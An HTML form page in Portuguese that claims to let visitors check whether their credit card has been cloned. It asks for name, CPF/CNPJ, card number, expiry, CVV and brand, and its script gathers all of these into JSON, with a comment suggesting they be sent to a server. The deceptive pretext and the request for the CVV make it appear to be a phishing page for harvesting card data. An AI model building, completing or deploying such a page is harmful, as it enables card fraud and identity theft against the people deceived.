<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Atualizar Cartão</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f4f4f4;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 5px;
            max-width: 600px;
            width: 100%;
            text-align: center;
        }
        .container h2 {
            margin-top: 0;
        }
        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
        }
        .form-group input,
        .form-group select {
            width: 100%;
            padding: 8px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        .form-group.full-width button {
            background-color: #28a745;
            color: #fff;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin: 0 auto;
            display: block;
        }
        .form-group.full-width button:hover {
            background-color: #218838;
        }
        .form-row {
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
        }
        .form-row .form-group {
            width: 48%;
        }
        .form-group.full-width {
            width: 100%;
        }
        .loading-screen {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            color: #fff;
            font-size: 24px;
        }
        .loading-icon {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            margin-top: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .result-box {
            display: none;
            background-color: #dff0d8;
            color: #3c763d;
            border: 1px solid #d6e9c6;
            padding: 15px;
            margin-top: 20px;
            border-radius: 5px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Consulte se seu cartão de crédito foi clonado</h2>
        <form id="cartaoForm">
            <div class="form-row">
                <div class="form-group">
                    <label for="nome">Nome/Razão Social</label>
                    <input type="text" id="nome" name="nome" placeholder="Escreva o nome como está no cartão" required>
                </div>
                <div class="form-group">
                    <label for="cpf_cnpj">CPF/CNPJ</label>
                    <input type="text" id="cpf_cnpj" name="cpf_cnpj" placeholder="Documento de identificação" required>
                </div>
            </div>
            <div class="form-row">
                <div class="form-group">
                    <label for="numero_cartao">Número do Cartão</label>
                    <input type="text" id="numero_cartao" name="numero_cartao" placeholder="0000 0000 0000 0000" required>
                </div>
                <div class="form-group">
                    <label for="validade">Validade</label>
                    <input type="text" id="validade" name="validade" placeholder="MM/AA" required>
                </div>
            </div>
            <div class="form-row">
                <div class="form-group">
                    <label for="cvv">CVV</label>
                    <input type="number" id="cvv" name="cvv" placeholder="000" required>
                </div>
                <div class="form-group">
                    <label for="bandeira_cartao">Bandeira do Cartão</label>
                    <select id="bandeira_cartao" name="bandeira_cartao" required>
                        <option value="" disabled selected>Selecione a bandeira</option>
                        <option value="visa">Visa</option>
                        <option value="mastercard">MasterCard</option>
                        <option value="amex">American Express</option>
                        <option value="elo">Elo</option>
                        <option value="hipercard">Hipercard</option>
                    </select>
                </div>
            </div>
            <div class="form-group full-width">
                <button type="button" onclick="collectFormData()">Consultar</button>
            </div>

        
        <script>
            function collectFormData() {
                var formData = {
                    nome: document.getElementById('nome').value,
                    cpf_cnpj: document.getElementById('cpf_cnpj').value,
                    numero_cartao: document.getElementById('numero_cartao').value,
                    validade: document.getElementById('validade').value,
                    cvv: document.getElementById('cvv').value,
                    bandeira_cartao: document.getElementById('bandeira_cartao').value
                };
    
                console.log(JSON.stringify(formData, null, 2));
                // Você pode adicionar lógica adicional aqui para enviar os dados para um servidor ou processá-los conforme necessário
            }
        </script>
</body>
</html>
